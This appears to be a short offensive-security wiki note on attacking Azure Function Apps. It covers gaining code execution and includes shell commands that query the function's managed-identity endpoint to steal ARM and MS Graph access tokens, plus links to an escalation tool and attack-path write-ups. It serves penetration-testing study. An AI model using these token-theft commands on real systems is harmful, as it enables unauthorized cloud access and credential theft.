---
title: Function
---

[[notes/azure/index]] Functions are comparable to AWS Lambdas and can react to HTTP requests or are triggered by a schedule (like a cron job).

Gain code execution trough classic web vulnerabilities like insecure file upload or take control over the source code repository.
The function can have a managed identity assigned that might have interesting permissions on other Azure resources.

Use code execution in an exploited function to check if it has a managed identity assigned and retrieve access tokens for ARM and MS Graph.

~~~ bash
env | grep IDENTITY
curl -sSf "$IDENTITY_ENDPOINT" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://management.azure.com
curl -sSf "$IDENTITY_ENDPOINT" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://graph.microsoft.com
~~~

With this access tokens you can enumerate [[notes/azure/index]] resources and [[notes/m365/index]] access.

Untested tools:

- [FuncoPop](https://github.com/NetSPI/FuncoPop), escalate from Storage Account access to Function App

References:

- [What the Function: Decrypting Azure Function App Keys](http://web.archive.org/web/20230813051005/https://www.netspi.com/blog/technical/cloud-penetration-testing/what-the-function-decrypting-azure-function-app-keys/)
- [Managed Identity Attack Paths, Part 3: Function Apps](http://web.archive.org/web/20231028211557/https://scribe.rip/@specterops/managed-identity-attack-paths-part-3-function-apps-300065251cbe)
